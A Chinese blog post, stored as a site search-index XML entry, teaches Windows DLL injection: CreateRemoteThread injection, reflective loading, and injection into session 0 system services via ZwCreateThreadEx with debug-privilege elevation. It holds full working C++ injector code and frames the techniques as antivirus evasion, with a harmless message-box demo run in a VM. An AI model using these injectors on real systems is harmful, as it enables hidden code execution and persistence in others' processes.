<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>dll注入与session0注入</title>
    <url>/2023/08/31/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<center>本篇主要介绍传统的dll注入,反射dll以及利用内核API的session0注入</center>

<span id="more"></span>

<h1 id="传统dll注入"><a href="#传统dll注入" class="headerlink" title="传统dll注入"></a>传统dll注入</h1><p>所谓dll注入就是将一个dll(动态链接库)加载到要被注入的进程的内存空间，使其成为进程的一部分。</p>
<h2 id="1-dll注入步骤"><a href="#1-dll注入步骤" class="headerlink" title="1.dll注入步骤"></a>1.dll注入步骤</h2><p>传统的dll注入大致可以分为以下几个步骤：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>所用API</th>
</tr>
</thead>
<tbody><tr>
<td>打开要注入的进程</td>
<td>OpenProcess</td>
</tr>
<tr>
<td>在进程的内存中申请内存空间</td>
<td>virtualAllocEx</td>
</tr>
<tr>
<td>写入内存</td>
<td>writeProcessMemory</td>
</tr>
<tr>
<td>从kenrel32.dll中获取LoadLibrary</td>
<td>GetProcAddress</td>
</tr>
<tr>
<td>创建远程线程加载dll</td>
<td>CreateRemoteThread</td>
</tr>
<tr>
<td>等待线程函数结束</td>
<td>WaitForSingleObject</td>
</tr>
<tr>
<td>释放dll空间</td>
<td>VirtualFreeEx</td>
</tr>
<tr>
<td>关闭句柄</td>
<td>CloseHandle</td>
</tr>
</tbody></table>
<h2 id="2-代码实践"><a href="#2-代码实践" class="headerlink" title="2.代码实践"></a>2.代码实践</h2><p>目标：通过dll注入使加载notepad时弹出消息框，显示“dll注入成功”。</p>
<p>首先在vs中创建一个dll项目，dll代码如下图所示</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831124516436.png" alt="image-20230831124516436"></p>
<p>创建一个用于注入dll的(中转)程序</p>
<p>代码如下(使用c++)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;//CreateToolhelp32Snapshot在此头文件中,获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br><span class="line">DWORD GetProcessPID(LPCTSTR lpProcessName) &#123;</span><br><span class="line">    DWORD Ret = 0;</span><br><span class="line">    PROCESSENTRY32 p32;//描述获取快照时驻留在系统地址空间中的进程的列表中的条目</span><br><span class="line">    HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//如果函数失败，它将返回 INVALID_HANDLE_VALUE</span><br><span class="line">    //TH32CS_SNAPPROCESS包括系统快照中的所有进程</span><br><span class="line">    if (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        printf(&quot;获取进程快照失败，error:%d&quot;, ::GetLastError());</span><br><span class="line">        return Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line">    ::Process32First(lpSnapshot,&amp;p32); //检索有关系统快照中遇到的第一个进程的信息。</span><br><span class="line">    do &#123;</span><br><span class="line">        if (!lstrcmp(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (::Process32Next(lpSnapshot, &amp;p32));</span><br><span class="line">    ::CloseHandle(lpSnapshot);</span><br><span class="line">    return Ret;</span><br><span class="line">&#125;</span><br><span class="line">//dll注入的主要过程实现函数</span><br><span class="line">DWORD RemoteThreadInject(DWORD pid, LPCWSTR DllName) &#123;</span><br><span class="line">    DWORD size = 0;</span><br><span class="line">    DWORD DllAddr = 0;</span><br><span class="line">    //1.打开进程</span><br><span class="line">    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    if (hprocess == NULL) &#123;</span><br><span class="line">        printf(&quot;OpenProcess error!\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //2.计算dll路径长度</span><br><span class="line">    size = (wcslen(DllName) + 1) * sizeof(TCHAR);</span><br><span class="line">    //申请空间</span><br><span class="line">    LPVOID pAllocMemory = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    //MEM_COMMIT 从指定保留内存页的磁盘的总内存大小和分页文件分配内存费用。 函数还保证当调用方稍后最初访问内存时，内容将为零。 除非实际访问虚拟地址，否则不会分配实际物理页面。</span><br><span class="line">    //PAGE_READWRITE 内存保护选项</span><br><span class="line">    if (pAllocMemory == NULL) &#123;</span><br><span class="line">        printf(&quot;申请内存空间失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //3.写入内存</span><br><span class="line">    BOOL write = WriteProcessMemory(hprocess, pAllocMemory, DllName, size, NULL);</span><br><span class="line">    if (pAllocMemory == 0) &#123;</span><br><span class="line">        printf(&quot;写入内存失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //4.从kenrel32.dll中获取LoadLibrary</span><br><span class="line">    FARPROC pThread = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</span><br><span class="line">    //GetProcAddress返回值是导出的函数或变量的地址</span><br><span class="line">    LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line">    //LPTHREAD_START_ROUTINE是一个指向已经开始执行的代码的指针</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;创建线程失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //6.等待线程结束</span><br><span class="line">    WaitForSingleObject(hThread, -1);//-1为直到线程结束才停止</span><br><span class="line">    //7.释放DLL空间</span><br><span class="line">    VirtualFreeEx(hprocess, pAllocMemory, size, MEM_DECOMMIT);</span><br><span class="line">    //8.关闭句柄</span><br><span class="line">    CloseHandle(hprocess);</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">int wmain(int argc,wchar_t* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if (argc != 3) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;参数数量不对\n&quot;;</span><br><span class="line">        std::cout &lt;&lt; &quot;格式为DLLInject.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD PID = GetProcessPID(argv[1]);</span><br><span class="line">    if (PID == 0) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;不存在该进程\n&quot;;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    RemoteThreadInject(PID, argv[2]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将dll与中转程序放入虚拟机运行。用cmd.exe运行中转程序，传入中转程序名，进程名以及dll名。</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831135621279.png" alt="image-20230831135621279"></p>
<p>成功！</p>
<p>但是传统DLL注入会遇到如下问题：</p>
<p>1.CreateRemoteThread为用户态API,没用权限注入系统服务进程。</p>
<p>2.需要使用LoadLibrary向进程中注入，容易被查杀。</p>
<p>对于第一个问题我们可以使用session0注入的方式调用ZwCreateThreadEx的方式解决。</p>
<p>对于第二个问题我们可以采用下面所说的反射DLL。</p>
<h1 id="反射dll"><a href="#反射dll" class="headerlink" title="反射dll"></a>反射dll</h1><p>反射型dll注入使用ReflectiveLoader代替LoadLibrary,从而避免了向进程注册DLL模块。</p>
<h2 id="1-反射DLL的注入流程"><a href="#1-反射DLL的注入流程" class="headerlink" title="1.反射DLL的注入流程"></a>1.反射DLL的注入流程</h2><p>1.获取被注入进程未解析的dll基地址。</p>
<p>2.获取必要的dll句柄和函数为修复导入表做准备。</p>
<p>3.将DLL文件头写入内存。</p>
<p>4.通过解析区块表将每个区块写入内存。</p>
<p>3.修复导入表和重定向表。</p>
<p>4.调用DLLMain函数的入口点。</p>
<h2 id="2-代码实现与解析"><a href="#2-代码实现与解析" class="headerlink" title="2.代码实现与解析"></a>2.代码实现与解析</h2><p>具体实现代码可以参照下面的项目以及一位大佬的讲解。</p>
<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/599022106">https://zhuanlan.zhihu.com/p/599022106</a></p>
<h1 id="session0注入"><a href="#session0注入" class="headerlink" title="session0注入"></a>session0注入</h1><p>在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0。在介绍session0注入之前，我们先介绍以下两个概念。</p>
<h2 id="1-未导出API与未文档化API"><a href="#1-未导出API与未文档化API" class="headerlink" title="1.未导出API与未文档化API"></a>1.未导出API与未文档化API</h2><p>未导出API:在0环里实现。但是没有从dll导出，3环程序无法使用，不能用GetProAccess获取。可以使用特征码匹配来获取。</p>
<p>未文档化API:没有写入开发文档，在DLL里面能够看到，但是不知道参数，无法直接用，可以查找逆向内核的大佬的网站来查看参数，定义结构，用GetProAccess获取。</p>
<h2 id="2-session0注入的原理"><a href="#2-session0注入的原理" class="headerlink" title="2.session0注入的原理"></a>2.session0注入的原理</h2><p>session0注入就是利用了ZwCreateThreadEx这个未文档化API,实现了注入系统服务进程的功能。ZwCreateThreadEx 函数可以突破SESSION 0 隔离，将DLL注入到SESSION 0 隔离的系统服务进程中，CreateRemoteThread 注入系统进程会失败的原因是因为调用 ZwCreateThreadEx 创建远程线程时，第七个参数 CreateThreadFlags 为1。这样 会导致线程创建完成后一直挂起无法恢复进程运行，导致注入失败。</p>
<p>注：感兴趣的友友可以自己用ida以及0环windbg调试器追踪CreateRemoteThread以及CreateThread的调用。</p>
<h2 id="3-session0注入的步骤"><a href="#3-session0注入的步骤" class="headerlink" title="3.session0注入的步骤"></a>3.session0注入的步骤</h2><p>1.打开注入进程，获取进程句柄</p>
<p>2.在注入的进程申请内存地址</p>
<p>3.写入内存地址</p>
<p>4.获取LoadLibraryA函数地址</p>
<p>5.加载ntdll</p>
<p>6.获取ZwCreateThreadEx函数地址</p>
<p>7.使用 ZwCreateThreadEx 创建远线程，实现 DLL 注入</p>
<p>8.关闭句柄</p>
<p>注意：session0函数的重点必须拿到 SE_PRIVILEGE_ENABLED 权限，所以需要提权</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessPID</span><span class="params">(<span class="type">char</span>* lpProcessName)</span> </span>&#123;</span><br><span class="line">    DWORD Ret = <span class="number">0</span>;</span><br><span class="line">    tagPROCESSENTRY32 p32;</span><br><span class="line">    HANDLE lpSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取进程快照失败，error:%d&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    ::<span class="built_in">Process32First</span>(lpSnapshot, &amp;p32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">lstrcmpA</span>(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (::<span class="built_in">Process32Next</span>(lpSnapshot, &amp;p32));</span><br><span class="line">    ::<span class="built_in">CloseHandle</span>(lpSnapshot);</span><br><span class="line">    <span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//提权函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    BOOL fok = FALSE;</span><br><span class="line">    <span class="comment">//OpenProcessToken 函数打开与进程关联的访问令牌。</span></span><br><span class="line">    <span class="comment">//第二个参数指定一个 访问掩码，该掩码 指定访问令牌的请求访问类型</span></span><br><span class="line">    <span class="comment">//OKEN_ADJUST_PRIVILEGES	启用或禁用访问令牌中的特权所必需的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))&#123;</span><br><span class="line">        <span class="comment">//TOKEN_PRIVILEGES 结构包含有关访问令牌的一组特权的信息。</span></span><br><span class="line">        <span class="comment">//每个结构都包含特权的 LUID 和属性</span></span><br><span class="line">        TOKEN_PRIVILEGES tp;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;<span class="comment">//这必须设置为 Privileges 数组中的条目数</span></span><br><span class="line">        <span class="comment">//LookupPrivilegeValue 函数检索本地唯一标识符 (LUID) 指定系统上用于本地表示指定特权名称。</span></span><br><span class="line">        <span class="comment">//第二个参数该字符串指定权限的名称</span></span><br><span class="line">        <span class="comment">//第三个参数指向一个变量的指针，该变量接收 LUID</span></span><br><span class="line">        <span class="comment">//E_DEBUG_NAME 调试和调整另一个帐户拥有的进程内存所必需的。</span></span><br><span class="line">        <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">        <span class="comment">//SE_PRIVILEGE_ENABLED 权限已启用。</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">        <span class="comment">//AdjustTokenPrivileges 函数启用或禁用指定访问令牌中的特权</span></span><br><span class="line">        <span class="comment">//第一个参数访问令牌的句柄，其中包含要修改的权限。 句柄必须具有对令牌TOKEN_ADJUST_PRIVILEGES访问权限</span></span><br><span class="line">        <span class="comment">//第二参数指定函数是否禁用令牌的所有特权。 如果此值为 TRUE，则函数将禁用所有特权并忽略 NewState 参数。 如果为 FALSE，则函数根据第三个参数 参数指向的信息修改权限。</span></span><br><span class="line">        <span class="comment">//第三个参数指向 TOKEN_PRIVILEGES 结构的指针，该结构指定特权数组及其属性</span></span><br><span class="line">        <span class="comment">//第四个参数指定第三个参数指向的缓冲区的大小（以字节为单位）</span></span><br><span class="line">        <span class="comment">//第五个参数指向函数用 TOKEN_PRIVILEGES 结构填充的缓冲区的指针，该结构包含函数修改的任何特权的先前状态</span></span><br><span class="line">        <span class="comment">//第六个参数指向变量的指针，该变量接收第五个参数指向的缓冲区的所需大小（以字节为单位）</span></span><br><span class="line">        <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        fok = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInject</span><span class="params">(DWORD PID, <span class="type">const</span> <span class="type">char</span>* pszDllFileName)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">EnableDebugPrivilege</span>();</span><br><span class="line">    HANDLE hRemoteThread;</span><br><span class="line">    DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;打开进程失败,error:&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="built_in">lstrlenA</span>(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line">    LPVOID pDllAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pDllAddr) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;申请内存空间失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;写入内存失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HMODULE hNtdllDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hNtdllDll) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;加载ntdll.dll失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="comment">//网上找的ZwCreateThreadEx的参数形式</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64 </span></span><br><span class="line">     <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">     PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">     HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">     ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T ZeroBits, SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID pUnkown)</span></span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes, </span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter, </span></span></span><br><span class="line"><span class="params"><span class="function">        BOOL CreateSuspended, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dwStackSize, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw1, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw2, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx=(typedef_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;获取ZwCreateThreadEx失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;参数数量不对\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;格式为session0注入.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> PID= <span class="built_in">GetProcessPID</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">ZwCreateThreadExInject</span>(PID, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放入虚拟机，用cmd.exe运行，得到如图</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230901202310296.png" alt="image-20230901202310296"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>刚开始写博客，哪里有错误或者写的不好的地方欢迎各位大佬指出！感谢，后续会有更多免杀内容分享！</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
